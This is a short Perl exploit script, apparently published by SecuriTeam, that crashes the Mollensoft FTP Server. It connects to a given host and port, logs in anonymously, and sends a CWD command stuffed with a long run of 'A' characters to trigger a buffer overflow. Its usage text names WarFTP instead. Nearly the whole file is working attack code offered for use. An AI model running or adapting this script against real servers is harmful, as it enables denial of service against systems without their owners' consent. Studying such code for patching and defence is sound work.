#!/usr/bin/perl
#
# Mollensoft FTP Server CMD Buffer Overflow
#
# Orkut users? Come join the SecuriTeam community
# http://www.orkut.com/Community.aspx?cmm=44441

use strict;
use IO::Socket::INET;

usage() unless (@ARGV == 2);

my $host = shift(@ARGV);
my $port = shift(@ARGV);

# create the socket
my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$host,
PeerPort=>$port);
$socket or die "Cannot connect to host!\n";

$socket->autoflush(1);

# receive greeting
my $repcode = "220 ";
my $response = recv_reply($socket, $repcode);
print $response;

# send USER command
#my $username = "%00" x 2041;
my $username = "anonymous";
print "USER $username\r\n";
print $socket "USER $username\r\n";

select(undef, undef, undef, 0.002); # sleep of 2 milliseconds

# send PASS command
my $password = "a\@b.com";
print "PASS $password\r\n";
print $socket "PASS $password\r\n";

my $cmd = "CWD ";
$cmd .= "A" x 224; # Value can range from 224 to 1018
$cmd .= "\r\n";
print "length: ".length($cmd)."\n";
print $socket $cmd;

$repcode = "";
recv_reply($socket, $repcode);

close($socket);
exit(0);

sub usage
{
 # print usage information
 print "\nUsage:  Mollensoft_FTP_Server_crash.pl <host> <port>\n
<host> - The host to connect to
<port> - The TCP port which WarFTP is listening on\n\n";
 exit(1);
}

sub recv_reply
{
 # retrieve any reply
 my $socket = shift;
 my $repcode = shift;
 $socket or die "Can't receive on socket\n";

 my $res="";
 while(<$socket>)
 {
  $res .= $_;
  if (/$repcode/) { last; }
 }
 return $res;
}

